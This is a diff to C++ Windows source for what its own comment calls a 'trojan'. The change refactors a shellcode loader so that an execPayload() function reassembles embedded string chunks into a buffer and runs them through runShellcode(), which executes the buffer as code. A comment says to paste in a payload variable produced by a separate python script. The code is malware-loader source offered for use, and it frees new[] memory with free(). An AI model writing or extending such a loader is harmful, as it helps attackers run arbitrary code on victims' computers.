@@ -34,7 +34,6 @@
 #include <iostream>
 #include <Windows.h>
 #include <string>
-#include <vector>
 #pragma warning(disable:4996)
 
 using namespace std;
@@ -61,41 +60,38 @@ public:
 		((void(*)())exec)();
 
 	}
-	void execPayload(vector<string*> stringVec, int PayloadSize, int ArrSize) {
+	void execPayload(string *arrIn[], int PayloadSize, int ArrSize) {
 		/*
-			execPayload() is an attempt to streamline the getPayload(). At this
-			point the only issue seems to be taking the array in and accessing the
-			strings stored at the pointer for each. Working on using a vector as 
-			an alternate solution. Still in development, but the current working
-			solution is active in the getPayload() function.
+		execPayload() is an attempt to streamline the getPayload(). At this
+		point the only issue seems to be taking the array in and accessing the
+		strings stored at the pointer for each. Working on using a vector as
+		an alternate solution. Still in development, but the current working
+		solution is active in the getPayload() function.
 		*/
-		/*
 		ptr = new char[PayloadSize + 1]();
-		for (int i = 0; i < stringVec.size(); i++){
-			temp = stringVec[i].c_str();
-			strcat(ptr, temp);
+		for (int i = 0; i < ArrSize; i++){
+		temp = arrIn[i]->c_str();
+		strcat(ptr, temp);
 		}
 		runShellcode(make_pair(ptr, PayloadSize));
 		free(ptr);
-		*/
 	}
 	void getPayload(int choice) {
 		/*
-			getPayload() takes in the choice of what payload is to be executed. Based
-			off of a switch, it will execute the payload that corresponds the input.
-			Fairly straight forward.
+		getPayload() takes in the choice of what payload is to be executed. Based
+		off of a switch, it will execute the payload that corresponds the input.
+		This is set up so that you can have the trojan serve more than one function.
+
+		Replace PAYLOADNAME with the name of the variable created with the python 
+		script.
 		*/
 		switch (choice) {
 		case 0:
-			ptr = new char[PAYLOADNAMELen + 1]();
-			for (int i = 0; i < PAYLOADNAMEChunkCount; i++){
-				temp = PAYLOADNAMEArr[i]->c_str();
-				strcat(ptr, temp);
-			}
-			runShellcode(make_pair(ptr, PAYLOADNAMELen));
-			free(ptr);
+			execPayload(PAYLOADNAMEArr, PAYLOADNAMELen, PAYLOADNAMEChunkCount);
+			break;
 		default:
 			cout << "[*] Invalid choice...";
+			break;
 		}
 	}
 
